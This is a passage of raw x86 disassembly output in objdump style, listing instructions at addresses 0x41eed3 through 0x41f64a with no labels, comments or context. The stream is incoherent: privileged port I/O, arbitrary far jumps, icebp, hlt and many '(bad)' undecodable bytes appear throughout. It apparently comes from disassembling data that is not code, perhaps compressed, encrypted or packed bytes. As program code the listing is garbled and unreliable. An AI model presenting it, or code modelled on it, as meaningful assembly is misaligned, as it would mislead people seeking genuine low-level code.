  41eed3:	scas   eax,DWORD PTR es:[edi]
  41eed4:	or     eax,0xdb0abe4c
  41eed9:	mov    esi,0x682b3b09
  41eede:	fild   QWORD PTR [edx+0x56422082]
  41eee4:	cmp    dh,BYTE PTR ds:0xaa7218a2
  41eeea:	xlat   BYTE PTR ds:[ebx]
  41eeeb:	mov    ecx,DWORD PTR [esi]
  41eeed:	jae    0x41eef7
  41eeef:	int3   
  41eef0:	xchg   ebx,eax
  41eef1:	ins    BYTE PTR es:[edi],dx
  41eef2:	loopne 0x41eeb8
  41eef4:	sub    ch,ch
  41eef6:	sub    DWORD PTR [ecx],edi
  41eef8:	retf   
  41eef9:	xchg   esi,eax
  41eefa:	jns    0x41ef75
  41eefc:	ror    edx,cl
  41eefe:	xor    al,0xc8
  41ef00:	sbb    ebp,esi
  41ef02:	pop    ecx
  41ef03:	sub    edx,DWORD PTR [ecx+0x3]
  41ef06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef07:	xor    eax,0xb9d3d1cf
  41ef0c:	lahf   
  41ef0d:	sub    DWORD PTR ds:0x1db05874,edx
  41ef13:	adc    eax,0xd85d06d5
  41ef18:	into   
  41ef19:	fwait
  41ef1a:	rcl    BYTE PTR [ecx-0x3e],1
  41ef1d:	(bad)  
  41ef1e:	ss dec ebx
  41ef20:	mov    ebp,0xfdc711f9
  41ef25:	loope  0x41eef6
  41ef27:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef29:	jne    0x41ef93
  41ef2b:	fistp  DWORD PTR [eax]
  41ef2d:	mov    ah,0x7d
  41ef2f:	loopne 0x41eec5
  41ef31:	les    esi,FWORD PTR [ecx-0x62]
  41ef34:	mov    edi,0xf6874a76
  41ef39:	push   ebp
  41ef3a:	lahf   
  41ef3b:	shr    esp,1
  41ef3d:	sti    
  41ef3e:	retf   
  41ef3f:	push   esp
  41ef40:	ins    BYTE PTR es:[edi],dx
  41ef41:	pop    ss
  41ef42:	or     eax,0x93940e90
  41ef47:	call   FWORD PTR [ecx-0x24]
  41ef4a:	mov    ecx,0x5711b9ab
  41ef4f:	pop    ss
  41ef50:	sahf   
  41ef51:	mov    DWORD PTR [ebp-0x1ca45561],0x3b584d53
  41ef5b:	mov    esi,0xf1f9a947
  41ef60:	push   ss
  41ef61:	mov    ax,0x5ea6
  41ef65:	cld    
  41ef66:	(bad)  
  41ef67:	in     al,0xed
  41ef69:	ret    0x3ab1
  41ef6c:	sar    DWORD PTR [edx+0x5a],0xee
  41ef70:	dec    edx
  41ef71:	sub    al,0xf6
  41ef73:	test   esi,ebp
  41ef75:	sbb    al,0x79
  41ef77:	cwde   
  41ef78:	xor    BYTE PTR [ebx],0x1a
  41ef7b:	shl    BYTE PTR [ebp-0x39],cl
  41ef7e:	fwait
  41ef7f:	mov    esp,0x9b234ee7
  41ef84:	push   esp
  41ef85:	inc    edi
  41ef86:	loopne 0x41ef64
  41ef88:	stc    
  41ef89:	daa    
  41ef8a:	sub    eax,0xaf5e062b
  41ef8f:	mov    ebp,DWORD PTR [edx]
  41ef91:	mov    WORD PTR [edx-0x4b],gs
  41ef94:	and    esi,DWORD PTR [edx+esi*1+0x4a]
  41ef98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef99:	or     eax,0xf198ac91
  41ef9e:	cmp    dh,BYTE PTR [ebx-0x4a]
  41efa1:	sbb    BYTE PTR [ebx+0xa3d584e],0xe3
  41efa8:	aaa    
  41efa9:	adc    ebp,DWORD PTR [edi+eiz*4-0x5b]
  41efad:	out    0x93,eax
  41efaf:	or     eax,DWORD PTR [edx+edi*8]
  41efb2:	adc    DWORD PTR [eax+0x30],edi
  41efb5:	xchg   edi,eax
  41efb6:	sbb    esp,ebx
  41efb8:	or     dh,BYTE PTR [esi+0x23f7ac4d]
  41efbe:	out    0x22,al
  41efc0:	inc    edx
  41efc1:	pop    ebp
  41efc2:	sti    
  41efc3:	ss sub esi,ebx
  41efc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efc7:	jae    0x41eff0
  41efc9:	or     al,0xcd
  41efcb:	leave  
  41efcc:	mov    eax,0x8304f62b
  41efd1:	push   ds
  41efd2:	loopne 0x41ef60
  41efd4:	jmp    0x8342:0xb7d01fa
  41efdb:	pop    ebp
  41efdc:	clc    
  41efdd:	inc    eax
  41efde:	iret   
  41efdf:	ds mov edi,0x85d55b89
  41efe5:	mov    al,ds:0x6b42b021
  41efea:	push   esi
  41efeb:	cmp    eax,DWORD PTR [ebp-0x24]
  41efee:	imul   esi,DWORD PTR [ebp-0x17],0x844df982
  41eff5:	rcr    BYTE PTR ds:0x630ded2c,cl
  41effb:	cli    
  41effc:	or     BYTE PTR [ecx-0xb],ch
  41efff:	push   ecx
  41f000:	aaa    
  41f001:	imul   esp,DWORD PTR [edx],0x23cf07d2
  41f007:	mov    bl,0x7d
  41f009:	mov    bl,0xd5
  41f00b:	sbb    dh,BYTE PTR [edi]
  41f00d:	cmp    esp,esp
  41f00f:	outs   dx,DWORD PTR ds:[esi]
  41f010:	cmc    
  41f011:	and    eax,0x7f807c2b
  41f016:	out    dx,al
  41f017:	lock adc BYTE PTR [edx-0x5],cl
  41f01b:	push   ecx
  41f01c:	sub    BYTE PTR [eax],bh
  41f01e:	aam    0x2f
  41f020:	scas   al,BYTE PTR es:[edi]
  41f021:	sbb    eax,0x3527dec2
  41f026:	xchg   esi,eax
  41f027:	adc    DWORD PTR [eax],ebp
  41f029:	pusha  
  41f02a:	cmp    DWORD PTR [bp+si+0x253c],ecx
  41f02f:	jmp    0x8c70:0x3ae486a0
  41f036:	and    BYTE PTR [esp+ebx*8+0x575f8946],ch
  41f03d:	inc    ecx
  41f03e:	add    ecx,eax
  41f040:	sbb    ch,BYTE PTR [edi]
  41f042:	cmp    al,0x5c
  41f044:	fmul   QWORD PTR ds:[edi-0x1b]
  41f048:	xchg   esi,eax
  41f049:	loopne 0x41efec
  41f04b:	mov    ecx,esp
  41f04d:	push   ss
  41f04e:	lock loop 0x41f05b
  41f051:	cmp    BYTE PTR [eax+0x24fe9901],ah
  41f057:	imul   ecx,DWORD PTR [ebx-0x12265b89],0x27e050d8
  41f061:	dec    ecx
  41f062:	imul   esp,DWORD PTR [ebp+0x772b074c],0x1cef37d3
  41f06c:	sub    ebx,DWORD PTR [eax-0x5bca5cb7]
  41f072:	(bad)  fs:0x85c8d242
  41f079:	mov    bh,0xfe
  41f07b:	in     eax,dx
  41f07c:	fldenv [eax]
  41f07e:	retf   0x1067
  41f081:	ret    0x6144
  41f084:	test   ebx,0xc9376780
  41f08a:	dec    esp
  41f08b:	xchg   DWORD PTR [edx+ecx*4+0x73],edi
  41f08f:	adc    al,0x28
  41f091:	and    DWORD PTR [ecx+0x78],esp
  41f094:	push   cs
  41f095:	scas   al,BYTE PTR es:[edi]
  41f096:	cmp    eax,0x37dbbf2b
  41f09b:	jne    0x41f036
  41f09d:	or     al,0x36
  41f09f:	outs   dx,WORD PTR ds:[esi]
  41f0a1:	add    ah,BYTE PTR [esi-0x60]
  41f0a4:	stc    
  41f0a5:	xor    eax,0x7ee2a5b4
  41f0aa:	jmp    0xb0354e91
  41f0af:	ds pop edi
  41f0b1:	mov    bh,BYTE PTR [eax+edx*1-0xe24e9f4]
  41f0b8:	push   es
  41f0b9:	fst    QWORD PTR [ebx-0x27b38fb6]
  41f0bf:	test   esp,0x99089fdc
  41f0c5:	jg     0x41f072
  41f0c7:	dec    edx
  41f0c8:	dec    esp
  41f0c9:	daa    
  41f0ca:	pop    gs
  41f0cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0cd:	aam    0x81
  41f0cf:	lea    ebp,[edx-0x45887dd2]
  41f0d5:	cmc    
  41f0d6:	test   eax,0x99abc6c1
  41f0dc:	fisubr DWORD PTR [esi+0x2a460616]
  41f0e2:	pop    ds
  41f0e3:	jg     0x41f0f7
  41f0e5:	in     al,dx
  41f0e6:	out    0x97,eax
  41f0e8:	mov    al,ds:0x6b665a0f
  41f0ed:	cmp    cl,al
  41f0ef:	daa    
  41f0f0:	dec    ebp
  41f0f1:	jle    0x41f145
  41f0f3:	repz jno 0x41f105
  41f0f6:	popa   
  41f0f7:	in     al,0xe1
  41f0f9:	cmp    al,BYTE PTR [ecx-0x2]
  41f0fc:	ss inc esp
  41f0fe:	mov    dh,0x4b
  41f100:	nop
  41f101:	scas   eax,DWORD PTR es:[edi]
  41f102:	iret   
  41f103:	xchg   edi,eax
  41f104:	addr16 cmp eax,0xf8648887
  41f10a:	jecxz  0x41f0ad
  41f10c:	(bad)  
  41f10d:	mov    ebx,0x180de83
  41f112:	xchg   edi,eax
  41f113:	enter  0x751e,0xf3
  41f117:	jle    0x41f117
  41f119:	cmp    eax,0x9fff438b
  41f11e:	and    BYTE PTR [esi-0x66],0x6e
  41f122:	jp     0x41f0da
  41f124:	fdiv   DWORD PTR [eax-0x54]
  41f127:	shl    BYTE PTR [edi],0xd4
  41f12a:	shl    DWORD PTR [ebx+0x1a0790b3],1
  41f130:	ret    
  41f131:	xchg   bh,dl
  41f133:	push   cs
  41f134:	je     0x41f12e
  41f136:	inc    eax
  41f137:	jp     0x41f1aa
  41f139:	add    DWORD PTR [eax+0x5b],ebp
  41f13c:	repz cld 
  41f13e:	cmp    BYTE PTR [edi],ch
  41f140:	out    dx,eax
  41f141:	xor    ebx,ecx
  41f143:	cdq    
  41f144:	push   0x90916fca
  41f149:	dec    edi
  41f14a:	mov    BYTE PTR [edi+0x6a],dl
  41f14d:	mov    ah,0x38
  41f14f:	pop    esp
  41f150:	icebp  
  41f151:	inc    esi
  41f152:	xchg   esp,eax
  41f153:	das    
  41f154:	mov    esp,0x99c870d3
  41f159:	push   ecx
  41f15a:	xchg   DWORD PTR ds:0xf3d8f8a7,ecx
  41f160:	push   es
  41f161:	rcr    ebx,1
  41f163:	jno    0x41f16f
  41f165:	in     eax,0xca
  41f167:	mov    al,ds:0xe71257c2
  41f16c:	ins    BYTE PTR es:[edi],dx
  41f16d:	stos   DWORD PTR es:[edi],eax
  41f16e:	cwde   
  41f16f:	lea    esi,[edx-0x1a7e83f2]
  41f175:	(bad)  
  41f177:	js     0x41f1b9
  41f179:	repz arpl ax,sp
  41f17c:	retf   0x390e
  41f17f:	inc    esi
  41f180:	push   esp
  41f181:	mov    al,0x39
  41f183:	add    al,0x84
  41f185:	mov    dl,0xcf
  41f187:	mov    BYTE PTR ds:0xa7ca8fe5,bl
  41f18d:	cmp    ch,BYTE PTR [ebp+0x21]
  41f190:	mov    al,ds:0xa3400884
  41f195:	fnstcw WORD PTR ds:0x9f1fe0f0
  41f19b:	fild   DWORD PTR [edx+0x23fa2b8e]
  41f1a1:	lea    ebp,[ebx-0x27]
  41f1a4:	(bad)
  41f1a7:	out    0xd2,eax
  41f1a9:	jo     0x41f144
  41f1ab:	jne    0x41f131
  41f1ad:	sar    ch,cl
  41f1af:	xor    eax,0xcfeecceb
  41f1b4:	xor    bl,BYTE PTR [edi+0x1b72a11d]
  41f1ba:	inc    esp
  41f1bb:	data16 jg 0x41f20e
  41f1be:	push   0xffffff81
  41f1c0:	jecxz  0x41f1d1
  41f1c2:	ror    DWORD PTR [esi-0x468a5f0d],1
  41f1c8:	in     eax,dx
  41f1c9:	pop    esi
  41f1ca:	fadd   QWORD PTR [edx]
  41f1cc:	scas   al,BYTE PTR es:[edi]
  41f1cd:	and    BYTE PTR [eax+ebx*1+0x30ef1329],dl
  41f1d4:	cmp    ecx,DWORD PTR [ecx*1-0x1980d5f1]
  41f1db:	and    ecx,esp
  41f1dd:	mov    cl,0xb4
  41f1df:	xor    BYTE PTR [edx+0x57],dl
  41f1e2:	dec    esp
  41f1e3:	stc    
  41f1e4:	xor    al,bl
  41f1e6:	inc    esp
  41f1e7:	pop    ss
  41f1e8:	mov    cl,0xe8
  41f1ea:	push   ds
  41f1eb:	mov    dl,0xdf
  41f1ed:	adc    al,0x1a
  41f1ef:	jmp    0x6059:0xbf973232
  41f1f6:	push   eax
  41f1f7:	in     al,0x52
  41f1f9:	daa    
  41f1fa:	aas    
  41f1fb:	xor    eax,0xe53d074e
  41f200:	cmp    eax,0xbf965c3a
  41f205:	xchg   edi,eax
  41f206:	retf   
  41f207:	sub    ebx,DWORD PTR [ebp+0x5cddca23]
  41f20d:	into   
  41f20e:	and    DWORD PTR [ecx],eax
  41f210:	mov    esi,0x87f293c2
  41f215:	sbb    al,BYTE PTR [edi+edi*1]
  41f218:	lods   eax,DWORD PTR ds:[esi]
  41f219:	sbb    DWORD PTR [ebx],esi
  41f21b:	scas   eax,DWORD PTR es:[edi]
  41f21c:	jns    0x41f229
  41f21e:	jmp    0x41f23c
  41f220:	aad    0x52
  41f222:	(bad)  
  41f224:	shl    dh,1
  41f226:	(bad)  
  41f227:	mov    ds:0x6fec352,al
  41f22c:	xchg   ecx,eax
  41f22d:	mov    eax,ds:0x7cabb8a6
  41f232:	sar    esi,cl
  41f234:	data16 jl 0x41f28c
  41f237:	cld    
  41f238:	sub    al,BYTE PTR [edx-0x3146856]
  41f23e:	iret   
  41f23f:	mov    eax,0x601f7b0b
  41f244:	cmp    BYTE PTR [edx+0x2339c919],dh
  41f24a:	stos   BYTE PTR es:[edi],al
  41f24b:	lds    ecx,FWORD PTR [edx+0x4]
  41f24e:	push   esp
  41f24f:	mov    dl,0x7f
  41f251:	pop    esi
  41f252:	push   ecx
  41f253:	mov    bl,0x3f
  41f255:	jp     0x41f232
  41f257:	mov    eax,0x6ab84c7c
  41f25c:	mov    eax,ds:0x4c92b7e8
  41f261:	int3   
  41f262:	outs   dx,DWORD PTR ds:[esi]
  41f263:	mov    ecx,0x646d1f0a
  41f268:	fidiv  WORD PTR [ebx+0x63]
  41f26b:	cs hlt 
  41f26d:	push   0xe6217036
  41f272:	in     eax,0x97
  41f274:	scas   al,BYTE PTR es:[edi]
  41f275:	add    DWORD PTR [edi],edi
  41f277:	sub    cl,BYTE PTR cs:[eax-0x5a]
  41f27b:	inc    ebx
  41f27c:	loop   0x41f2fd
  41f27e:	fdiv   DWORD PTR [eax+0x46]
  41f281:	pop    esi
  41f282:	imul   DWORD PTR [edx+0x526b29c5]
  41f288:	shl    BYTE PTR [ecx+0x33],cl
  41f28b:	or     BYTE PTR [edi+ebx*4+0x4ed6e11],ch
  41f292:	and    ebx,DWORD PTR [esi+ecx*8]
  41f295:	push   edi
  41f296:	loop   0x41f239
  41f298:	adc    al,0x61
  41f29a:	ret    
  41f29b:	and    DWORD PTR [ebx-0x46],ecx
  41f29e:	mov    esp,0xfccee1f4
  41f2a3:	xchg   DWORD PTR [ebx-0x7acab1fa],ebx
  41f2a9:	test   eax,0x9e6e0f80
  41f2ae:	push   ss
  41f2af:	ds int3 
  41f2b1:	and    eax,esp
  41f2b3:	pushf  
  41f2b4:	pop    ebp
  41f2b5:	stos   DWORD PTR es:[edi],eax
  41f2b6:	stc    
  41f2b7:	popf   
  41f2b8:	jp     0x41f270
  41f2ba:	cdq    
  41f2bb:	je     0x41f24b
  41f2bd:	pop    eax
  41f2be:	lea    esp,[edx+eiz*2-0x43]
  41f2c2:	adc    eax,0xd41f66d3
  41f2c7:	jne    0x41f2b4
  41f2c9:	push   0x3954220c
  41f2ce:	cmp    DWORD PTR [ebx+eax*8-0x7707ba44],ebp
  41f2d5:	add    esi,ecx
  41f2d7:	add    dh,BYTE PTR [ebx+ebp*1]
  41f2da:	lods   al,BYTE PTR ds:[esi]
  41f2db:	out    0xed,eax
  41f2dd:	in     al,dx
  41f2de:	in     al,dx
  41f2df:	sbb    edx,DWORD PTR [eax]
  41f2e1:	jecxz  0x41f2ea
  41f2e3:	in     ax,0x64
  41f2e6:	mov    ah,0xe9
  41f2e8:	fisttp WORD PTR [ebx+0x43]
  41f2eb:	imul   ebx,ecx,0x2f
  41f2ee:	mov    DWORD PTR [ebp+0x30],ebp
  41f2f1:	mov    bh,0x6
  41f2f3:	jg     0x41f2b3
  41f2f5:	cs ins BYTE PTR es:[edi],dx
  41f2f7:	(bad)  
  41f2f8:	jnp    0x41f32e
  41f2fa:	mov    dl,0x60
  41f2fc:	mov    ds:0x1f96ead2,eax
  41f301:	outs   dx,BYTE PTR ds:[esi]
  41f302:	in     eax,0xc6
  41f304:	sbb    DWORD PTR [edi+0x70],esp
  41f307:	jae    0x41f331
  41f309:	call   0x5dec:0x97bd
  41f30f:	inc    ecx
  41f310:	adc    DWORD PTR [edx-0x7675a253],ebx
  41f316:	xchg   esp,eax
  41f317:	in     al,dx
  41f318:	hlt    
  41f319:	test   al,0x45
  41f31b:	scas   eax,DWORD PTR es:[edi]
  41f31c:	jle    0x41f377
  41f31e:	xchg   bh,bl
  41f320:	and    BYTE PTR [edi],0x17
  41f323:	out    0x86,eax
  41f325:	gs and eax,0xfabc8a29
  41f32b:	icebp  
  41f32c:	cli    
  41f32d:	outs   dx,DWORD PTR ds:[esi]
  41f32e:	or     dl,BYTE PTR [ecx]
  41f330:	out    dx,al
  41f331:	fdivrp st(0),st
  41f333:	adc    eax,0xa324e36
  41f338:	out    dx,eax
  41f339:	icebp  
  41f33a:	jae    0x41f339
  41f33c:	dec    esp
  41f33d:	add    BYTE PTR [ecx+0x8],cl
  41f340:	jns    0x41f333
  41f342:	iret   
  41f343:	fs pushf 
  41f345:	fs xchg esi,eax
  41f347:	jbe    0x41f365
  41f349:	or     al,0x2d
  41f34b:	popa   
  41f34c:	stos   BYTE PTR es:[edi],al
  41f34d:	test   al,0xd4
  41f34f:	imul   edx,DWORD PTR [eax],0xeea999be
  41f355:	push   edi
  41f356:	jno    0x41f397
  41f358:	(bad)  
  41f359:	cmc    
  41f35a:	mov    cl,0x5
  41f35c:	and    DWORD PTR [esi+ebp*1-0x7286a6ed],ebx
  41f363:	(bad)  
  41f364:	hlt    
  41f365:	mov    bh,0x45
  41f367:	push   esi
  41f368:	jne    0x41f35b
  41f36a:	nop
  41f36b:	mov    dl,0xf2
  41f36d:	jmp    0x41f30b
  41f36f:	pop    edi
  41f370:	push   ecx
  41f371:	loop   0x41f31c
  41f373:	int3   
  41f374:	pop    eax
  41f375:	inc    ebx
  41f376:	adc    al,0x4a
  41f378:	stos   DWORD PTR es:[edi],eax
  41f379:	shl    al,cl
  41f37b:	dec    esi
  41f37c:	mov    bl,0xd4
  41f37e:	fist   DWORD PTR [edx+edx*4-0x71]
  41f382:	out    dx,al
  41f383:	adc    ch,BYTE PTR [edx+0x2400c3af]
  41f389:	les    ebx,FWORD PTR [ecx+0x50]
  41f38c:	inc    ecx
  41f38d:	add    al,0x4a
  41f38f:	xchg   ebp,eax
  41f390:	and    BYTE PTR [eax+0x50],bh
  41f393:	mov    BYTE PTR [edi],al
  41f395:	mov    bl,0xc2
  41f397:	push   ds
  41f398:	and    BYTE PTR [ebx-0x41],al
  41f39b:	push   ds
  41f39c:	fld    DWORD PTR [edx-0x786a1118]
  41f3a2:	inc    edx
  41f3a3:	stos   DWORD PTR es:[edi],eax
  41f3a4:	popa   
  41f3a5:	and    BYTE PTR [eax],ah
  41f3a7:	or     esi,DWORD PTR [edx]
  41f3a9:	pop    edi
  41f3aa:	xchg   ebx,eax
  41f3ab:	cmc    
  41f3ac:	mov    al,ds:0x871ab491
  41f3b1:	mov    ebx,0xbae12456
  41f3b6:	dec    esi
  41f3b7:	push   0x29
  41f3b9:	das    
  41f3ba:	scas   eax,DWORD PTR es:[edi]
  41f3bb:	loope  0x41f3af
  41f3bd:	ret    
  41f3be:	sbb    dl,BYTE PTR [edx+0x72]
  41f3c1:	scas   al,BYTE PTR es:[edi]
  41f3c2:	clc    
  41f3c3:	into   
  41f3c4:	add    edi,0xbbdc578f
  41f3ca:	call   DWORD PTR ds:0xa72fb91
  41f3d0:	into   
  41f3d1:	cmp    al,0xca
  41f3d3:	(bad)  
  41f3d4:	in     al,dx
  41f3d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3d6:	sub    esp,edi
  41f3d8:	dec    esp
  41f3d9:	clc    
  41f3da:	xchg   ebp,eax
  41f3db:	(bad)  
  41f3dc:	sub    eax,0x7992923c
  41f3e1:	adc    eax,ebp
  41f3e3:	test   al,0x30
  41f3e5:	mov    DWORD PTR [ebx+0x3e],esi
  41f3e8:	and    ch,BYTE PTR [ebx]
  41f3ea:	add    al,0xd1
  41f3ec:	das    
  41f3ed:	mov    DWORD PTR [esi],eax
  41f3ef:	or     BYTE PTR [esi+ebp*2+0x47],0xa3
  41f3f4:	sbb    al,BYTE PTR [eax]
  41f3f6:	adc    ebx,ebp
  41f3f8:	sbb    esi,eax
  41f3fa:	mov    bl,0xab
  41f3fc:	(bad)  
  41f3fe:	adc    eax,DWORD PTR [ebp+0x7b]
  41f401:	and    DWORD PTR [edx-0x66],edi
  41f404:	outs   dx,DWORD PTR ds:[esi]
  41f405:	inc    esp
  41f406:	repz test eax,0xb6b0719a
  41f40c:	cmp    BYTE PTR [ebx+0x22],0xb4
  41f410:	sbb    BYTE PTR [ebp-0xc],bh
  41f413:	xchg   ebx,eax
  41f414:	add    BYTE PTR ss:[ebx+0x39],0xd8
  41f419:	popf   
  41f41a:	pop    eax
  41f41b:	js     0x41f48e
  41f41d:	and    al,0x89
  41f41f:	ss sub bl,al
  41f422:	je     0x41f427
  41f424:	push   ebx
  41f425:	pop    esi
  41f426:	stc    
  41f427:	inc    ebx
  41f428:	sbb    BYTE PTR ds:0xc9455e58,al
  41f42e:	call   FWORD PTR [edi-0x236445da]
  41f434:	inc    ecx
  41f435:	fiadd  WORD PTR [ebx+ebp*4-0x49]
  41f439:	sbb    BYTE PTR [esi],bh
  41f43b:	cmp    ah,ch
  41f43d:	or     BYTE PTR [esi+0xc],bl
  41f440:	retf   0xec0f
  41f443:	mov    ebx,0x8537a331
  41f448:	lock and eax,0x79eb4523
  41f44e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f44f:	test   al,0x20
  41f451:	mov    dl,0x48
  41f453:	push   0xffffffc1
  41f455:	pop    esp
  41f456:	stc    
  41f457:	call   0x5bbb95f6
  41f45c:	stos   BYTE PTR es:[edi],al
  41f45d:	dec    BYTE PTR [ebx+ebp*1+0x62]
  41f461:	jge    0x41f493
  41f463:	icebp  
  41f464:	mov    WORD PTR [ecx+eax*1+0x3ab1eb0],es
  41f46b:	mov    ecx,DWORD PTR [edi-0x6]
  41f46e:	retf   0x588c
  41f471:	cwde   
  41f472:	popf   
  41f473:	inc    ebp
  41f474:	pop    ebp
  41f475:	in     al,dx
  41f476:	ret    
  41f477:	add    DWORD PTR [ebx+ecx*2],0xc
  41f47b:	shr    DWORD PTR [eax-0x59],1
  41f47e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f47f:	retf   
  41f480:	sub    BYTE PTR [edx-0x5f8b062d],ch
  41f486:	mov    ch,0xbe
  41f488:	int    0xe
  41f48a:	stc    
  41f48b:	loope  0x41f4f6
  41f48d:	xor    dh,BYTE PTR [edx+0x67]
  41f490:	sub    al,0xb9
  41f492:	pop    ecx
  41f493:	inc    ebx
  41f494:	mov    edi,0xe2e3403e
  41f499:	dec    ebp
  41f49a:	sbb    al,0xe2
  41f49c:	std    
  41f49d:	inc    eax
  41f49e:	gs mov dh,0xec
  41f4a1:	rol    BYTE PTR [ecx-0x65e88dcf],cl
  41f4a7:	rcr    bl,0x99
  41f4aa:	dec    eax
  41f4ab:	call   0x3e9c:0xfc9f2103
  41f4b2:	shl    DWORD PTR [eax-0x18dd91d8],0x4d
  41f4b9:	retf   0xf5b8
  41f4bc:	push   esi
  41f4bd:	jns    0x41f519
  41f4bf:	sbb    esi,ebp
  41f4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c2:	sbb    al,0x4c
  41f4c4:	xchg   DWORD PTR [eax+0x5c],edx
  41f4c7:	and    al,0xb7
  41f4c9:	add    eax,0xe3179919
  41f4ce:	jmp    0x18ac:0xd142933b
  41f4d5:	popf   
  41f4d6:	ret    
  41f4d7:	xchg   BYTE PTR [ebx],dl
  41f4d9:	shl    DWORD PTR [edx],0x2
  41f4dc:	push   ss
  41f4dd:	mov    ah,0x2b
  41f4df:	or     eax,0x80acd4a
  41f4e4:	aas    
  41f4e5:	clc    
  41f4e6:	les    ebp,FWORD PTR [ebx+ecx*8-0x5381f7dc]
  41f4ed:	xor    dh,0x7a
  41f4f0:	jno    0x41f4de
  41f4f2:	pop    esi
  41f4f3:	ror    DWORD PTR [ecx],cl
  41f4f5:	gs cwde 
  41f4f7:	cli    
  41f4f8:	fisttp QWORD PTR [eax+eax*2]
  41f4fb:	xchg   eax,eax
  41f4fd:	outs   dx,BYTE PTR ds:[esi]
  41f4fe:	mov    ch,0xd
  41f500:	xor    dh,bh
  41f502:	fwait
  41f503:	jb     0x41f518
  41f505:	aad    0x68
  41f507:	sub    BYTE PTR [ebp-0x3319fc3e],bl
  41f50d:	pushf  
  41f50e:	inc    ebx
  41f50f:	(bad)
  41f512:	push   0xffffffd6
  41f514:	in     eax,dx
  41f515:	add    esp,DWORD PTR [ecx]
  41f517:	cs mov cl,al
  41f51a:	add    edi,DWORD PTR [esi-0x6f365f95]
  41f520:	ret    0xae6a
  41f523:	ror    edx,cl
  41f525:	mov    cl,0x88
  41f527:	cmp    ebx,DWORD PTR [ebx+esi*2]
  41f52a:	sbb    al,0x16
  41f52c:	ins    DWORD PTR es:[edi],dx
  41f52d:	jmp    0xc8b8a684
  41f532:	mov    eax,0xbd296a5a
  41f537:	scas   eax,DWORD PTR es:[edi]
  41f538:	js     0x41f51f
  41f53a:	ror    BYTE PTR [ecx+0xe2096dc],1
  41f540:	ret    
  41f541:	gs add eax,0x80af78f6
  41f547:	mov    ah,0x8a
  41f549:	fisttp WORD PTR [esp+eax*8-0x48]
  41f54d:	fnstenv [edx-0x7ff6a4f4]
  41f553:	(bad)  
  41f554:	cdq    
  41f555:	and    BYTE PTR [ecx-0x31],al
  41f558:	(bad)  [ebx]
  41f55a:	jnp    0x41f5d2
  41f55c:	scas   al,BYTE PTR es:[edi]
  41f55d:	je     0x41f5ac
  41f55f:	(bad)  [eax]
  41f561:	inc    eax
  41f562:	mov    eax,0x6e45ad15
  41f567:	sbb    BYTE PTR [ebp-0x3e8e4ece],0x6c
  41f56e:	add    al,0x22
  41f570:	push   cs
  41f571:	call   FWORD PTR [ecx]
  41f573:	fs not bh
  41f576:	rcr    cl,0xe1
  41f579:	xor    DWORD PTR [ecx+0x67b21a8e],ebp
  41f57f:	pop    es
  41f580:	repnz push esp
  41f582:	mov    ecx,0xd39ba390
  41f587:	lock mov edx,ss
  41f58a:	call   0x8752b946
  41f58f:	sar    DWORD PTR [edx+ebx*8+0x5b5ff160],0x13
  41f597:	push   ebp
  41f598:	(bad)  
  41f599:	and    ah,dh
  41f59b:	mov    DWORD PTR [ecx+0x6c7538bd],edi
  41f5a1:	addr16 rcr edi,1
  41f5a4:	loop   0x41f54f
  41f5a6:	inc    esi
  41f5a7:	xchg   edi,eax
  41f5a8:	(bad)  
  41f5a9:	sti    
  41f5aa:	into   
  41f5ab:	cdq    
  41f5ac:	xchg   DWORD PTR [ecx-0x15d4d5a0],edi
  41f5b2:	fcmovne st,st(2)
  41f5b4:	sub    eax,0x7a78c89b
  41f5b9:	adc    dl,BYTE PTR [ebx+ecx*2]
  41f5bc:	pop    edi
  41f5bd:	pop    ecx
  41f5be:	inc    eax
  41f5bf:	or     al,0x66
  41f5c1:	dec    ebp
  41f5c2:	cld    
  41f5c3:	aam    0x6f
  41f5c5:	ror    DWORD PTR [esi+0x379d41],0x94
  41f5cc:	ins    DWORD PTR es:[edi],dx
  41f5cd:	rcr    DWORD PTR [edi],1
  41f5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5d0:	mov    ds:0x81a0faf3,eax
  41f5d5:	pop    ecx
  41f5d6:	pushf  
  41f5d7:	ja     0x41f566
  41f5d9:	sub    ebp,DWORD PTR [edi]
  41f5db:	sbb    ebx,ebp
  41f5dd:	pop    eax
  41f5de:	fisttp DWORD PTR [edx-0x6fd98e8]
  41f5e4:	sbb    edi,ebp
  41f5e6:	dec    esp
  41f5e7:	dec    ebx
  41f5e8:	mov    eax,0x496d421f
  41f5ed:	push   ds
  41f5ee:	ss and eax,0xf8e44c59
  41f5f4:	das    
  41f5f5:	pop    DWORD PTR [edx]
  41f5f7:	dec    esi
  41f5f8:	xchg   esi,eax
  41f5f9:	pop    esp
  41f5fa:	out    0x2c,al
  41f5fc:	scas   eax,DWORD PTR es:[edi]
  41f5fd:	xor    al,0x98
  41f5ff:	jns    0x41f5ef
  41f601:	imul   ebp,edx,0xffffffce
  41f604:	lahf   
  41f605:	ret    0x93bd
  41f608:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f60a:	setne  BYTE PTR [edi]
  41f60d:	push   0xd09a3e51
  41f612:	icebp  
  41f613:	sbb    BYTE PTR [edx],al
  41f615:	call   0xcbd1:0xff76b1a3
  41f61c:	dec    esi
  41f61d:	stc    
  41f61e:	mov    esi,0x5fe33713
  41f623:	or     esp,DWORD PTR [ebx]
  41f625:	jecxz  0x41f680
  41f627:	jg     0x41f67d
  41f629:	shr    al,cl
  41f62b:	out    0x67,eax
  41f62d:	stc    
  41f62e:	add    BYTE PTR [edi-0x63e746a0],0x3f
  41f635:	inc    edi
  41f636:	or     BYTE PTR [ebx],al
  41f638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f639:	inc    edx
  41f63a:	sbb    BYTE PTR [eax-0xdf2b391],0xe5
  41f641:	fidiv  WORD PTR ds:0xe530a9e9
  41f647:	in     eax,0x5a
  41f649:	push   es
  41f64a:	mov    ah,0x15
